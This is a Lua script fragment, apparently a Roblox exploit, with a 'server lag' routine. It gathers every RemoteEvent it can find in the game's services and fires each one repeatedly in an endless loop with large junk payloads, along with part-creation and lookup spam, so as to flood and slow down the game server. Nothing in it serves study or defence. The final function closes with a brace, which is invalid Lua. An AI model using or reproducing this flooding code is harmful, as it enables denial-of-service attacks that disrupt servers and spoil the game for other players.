-- SERVER LAG FUNCTION
local lagging = false
local function startLag()
    lagging = true
    local taskCounter = 0
    
    -- Try to find RemoteEvents to flood
    local remoteEvents = {}
    for _, obj in ipairs(ReplicatedStorage:GetChildren()) do
        if obj:IsA("RemoteEvent") then
            table.insert(remoteEvents, obj)
        end
    end
    
    -- Also check other services for RemoteEvents
    local servicesToCheck = {
        game:GetService("ReplicatedStorage"),
        game:GetService("StarterPlayer"),
        game:GetService("StarterGui"),
        game:GetService("StarterPack")
    }
    
    for _, service in ipairs(servicesToCheck) do
        if service then
            for _, obj in ipairs(service:GetChildren()) do
                if obj:IsA("RemoteEvent") and not table.find(remoteEvents, obj) then
                    table.insert(remoteEvents, obj)
                end
            end
        end
    end
    
    -- Flood loop
    task.spawn(function()
        while lagging do
            taskCounter = taskCounter + 1
            
            -- Flood any found RemoteEvents
            if #remoteEvents > 0 then
                for i = 1, 10 do
                    for _, remoteEvent in ipairs(remoteEvents) do
                        if remoteEvent and remoteEvent.Parent then
                            pcall(function()
                                remoteEvent:FireServer("LAG", taskCounter, string.rep("a", 1000))
                            end)
                        end
                    end
                end
            end
            
            -- Try to create massive amounts of parts (will fail but causes work)
            for i = 1, 50 do
                pcall(function()
                    local part = Instance.new("Part")
                    part.Parent = workspace
                    part:Destroy()
                end)
            end
            
            -- Flood with fake requests
            for i = 1, 100 do
                pcall(function()
                    ReplicatedStorage:FindFirstChild("Tiki")
                    ReplicatedStorage:FindFirstChild("News")
                    game:GetService("Players"):GetPlayers()
                end)
            end
            
            task.wait()
        end
    end
end

local function stopLag()
    lagging = false
}

